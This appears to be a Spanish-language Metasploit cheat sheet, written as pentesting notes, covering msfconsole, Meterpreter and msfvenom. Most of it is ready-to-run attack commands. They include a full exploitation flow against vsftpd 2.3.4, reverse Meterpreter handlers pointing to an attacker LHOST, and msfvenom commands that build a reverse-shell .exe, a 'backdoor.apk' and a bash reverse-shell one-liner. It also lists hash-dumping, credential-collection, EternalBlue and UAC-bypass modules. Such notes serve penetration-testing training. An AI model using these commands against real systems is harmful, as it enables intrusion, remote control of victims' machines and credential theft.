---

---

---

Tags: #metasploit #msf #pentesting #exploitation #exploits #msfconsole #msfvenom #meterpreter #postexploitation #auxiliary #payloads #reverse-shell #bind-shell #enumeration #recon #fuzzing #network #windows #linux #android

---
# **1. Visión general**

**Metasploit Framework (MSF)** es una plataforma modular para desarrollar, probar y ejecutar _exploits_ contra objetivos. Es una herramienta estándar en pentesting por su gran número de módulos, su facilidad de automatización y su integración con herramientas como Nmap, Burp Suite o Nessus.

---

# **2. Arquitectura de Metasploit**

|Componente|Descripción|
|---|---|
|**msfconsole**|Interfaz principal en línea de comandos.|
|**msfvenom**|Generador de payloads y binarios maliciosos.|
|**meterpreter**|Payload avanzado interactivo con múltiples funcionalidades.|
|**Metasploit DB**|Base de datos para gestionar hosts, vulns, loot y sesiones.|
|**Armitage / Cobalt Strike**|Interfaces gráficas (Armitage ya discontinuado).|

---

# **3. Tipos de módulos**

|Tipo|Ruta|Función|
|---|---|---|
|**Exploit**|`modules/exploits/`|Código que aprovecha una vulnerabilidad.|
|**Payload**|`modules/payloads/`|Código que se ejecuta tras explotar. Puede ser _singlestage_ o _staged_.|
|**Auxiliary**|`modules/auxiliary/`|Escaneo, fuzzing, enumeración, ataques sin explotación.|
|**Post**|`modules/post/`|Acciones post-explotación (pivoting, cred dumping, etc.).|
|**Encoders**|`modules/encoders/`|Ofuscan payloads para evitar AV.|
|**Nops**|`modules/nops/`|Padding para estabilidad del shellcode.|

---

# **4. Inicio rápido**

### **Iniciar Metasploit**

`msfconsole`

### **Actualizar módulos**

`msfupdate`

### **Habilitar la base de datos**

`msfdb init msfconsole`

---

# **5. Comandos esenciales de msfconsole**

|Comando|Función|
|---|---|
|`search <keyword>`|Buscar módulos.|
|`use <module>`|Cargar módulo.|
|`show options`|Mostrar parámetros.|
|`set <param> <value>`|Configurar opción.|
|`setg <param> <value>`|Configurar globalmente.|
|`run` / `exploit`|Ejecutar módulo.|
|`sessions`|Ver sesiones activas.|
|`sessions -i <id>`|Interactuar con sesión.|
|`back`|Volver al menú principal.|
|`exit`|Salir.|

---

# **6. Uso de Exploits**

### **Ejemplo: Explotación de vsftpd 2.3.4**

`search vsftpd use exploit/unix/ftp/vsftpd_234_backdoor show options set RHOSTS 192.168.1.10 set RPORT 21 run`

### **Salida esperada**

- Apertura de sesión shell.
    
- `sessions` mostrará una nueva sesión activa.
    

---

# **7. Gestión de Payloads**

### **Tipos principales**

|Tipo|Descripción|
|---|---|
|**Bind shell**|El atacante se conecta hacia la víctima.|
|**Reverse shell**|La víctima se conecta hacia el atacante.|
|**Meterpreter**|Shell avanzada con controles adicionales.|

### **Ejemplo: Reverse Meterpreter**

`set PAYLOAD linux/x86/meterpreter/reverse_tcp set LHOST 192.168.1.7 set LPORT 4444 run`

---

# **8. Meterpreter**

### **Comandos útiles**

|Comando|Función|
|---|---|
|`sysinfo`|Información del sistema.|
|`getuid`|Usuario actual.|
|`ps`|Lista de procesos.|
|`migrate <pid>`|Migrar proceso.|
|`download <file>`|Descargar archivo.|
|`upload <file>`|Subir archivo.|
|`shell`|Obtener shell del sistema.|
|`hashdump`|Extraer hashes (Windows).|
|`webcam_snap`|Tomar foto (si aplica).|

---

# **9. Modulos auxiliares (enumeración, escaneo, ataque)**

### **Ejemplos útiles**

|Módulo|Uso|
|---|---|
|`auxiliary/scanner/portscan/tcp`|Escaneo TCP.|
|`auxiliary/scanner/http/http_version`|Enumeración HTTP.|
|`auxiliary/scanner/smb/smb_version`|Enumeración SMB.|
|`auxiliary/admin/smb/ms17_010_command`|MS17-010 sin exploit.|

### **Ejemplo: escanear HTTP**

`use auxiliary/scanner/http/http_version set RHOSTS 192.168.1.0/24 run`

---

# **10. Módulos Post (post-explotación)**

|Módulo|Descripción|
|---|---|
|`post/windows/gather/hashdump`|Extraer hashes.|
|`post/multi/recon/local_exploit_suggester`|Sugerencias de exploits locales.|
|`post/windows/manage/enable_rdp`|Habilitar RDP.|
|`post/linux/gather/hashdump`|Extraer hashes de Linux.|

### **Ejemplo: buscar exploits locales**

`use post/multi/recon/local_exploit_suggester set SESSION 1 run`

---

# **11. Creación de payloads con msfvenom**

### **Sintaxis general**

`msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <formato> -o <outfile>`

### **Ejemplo: Payload en .exe**

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe`

### **Ejemplo: Payload en APK**

`msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -o backdoor.apk`

### **Ejemplo: One-liner en bash**

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f bash`

---

# **12. Integración con Nmap**

### **Escanear y volcar resultados en Metasploit**

`nmap -sV -oX scan.xml 192.168.1.0/24 db_import scan.xml hosts services`

---

# **13. Automatización y Resource Scripts**

Crear un script `.rc`:

`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.1.7 set LPORT 4444 run`

Ejecutarlo:

`msfconsole -r script.rc`

---

# **14. Ejemplo práctico completo (flujo de ataque)**

1. **Escaneo**
    
    `nmap -sV -p- 192.168.1.10`
    
2. **Identificar servicio vulnerable**
    
    - vsftpd 2.3.4
        
3. **Buscar módulo**
    
    `search vsftpd`
    
4. **Configurar exploit**
    
    `use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 192.168.1.10 set RPORT 21 run`
    
5. **Ganar sesión**
    
    `sessions sessions -i 1`
    
6. **Post-explotación**
    
    `sysinfo shell`
    

---

# **15. Tabla de módulos recomendados por categoría**

## **Exploits**

|Categoría|Módulos útiles|
|---|---|
|SMB|`exploit/windows/smb/ms17_010_eternalblue`|
|HTTP|`exploit/multi/http/struts_dmi_exec`|
|FTP|`exploit/unix/ftp/vsftpd_234_backdoor`|
|Windows Local|`exploit/windows/local/bypassuac_fodhelper`|

## **Auxiliary**

|Tipo|Módulo|
|---|---|
|Portscan|`auxiliary/scanner/portscan/tcp`|
|SMB|`auxiliary/scanner/smb/smb_version`|
|HTTP|`auxiliary/scanner/http/title`|

## **Post**

|SO|Módulos|
|---|---|
|Windows|`post/windows/gather/credentials/credential_collector`|
|Linux|`post/linux/gather/hashdump`|

---

# **16. Buenas prácticas**

- Mantener Metasploit actualizado.
    
- Usar entornos controlados (laboratorios).
    
- Documentar cada ejecución con `notes`.
    
- Establecer payloads _reverse_ para mayor compatibilidad.
    
- Evitar encoders si no son necesarios (los AV modernos los detectan igual).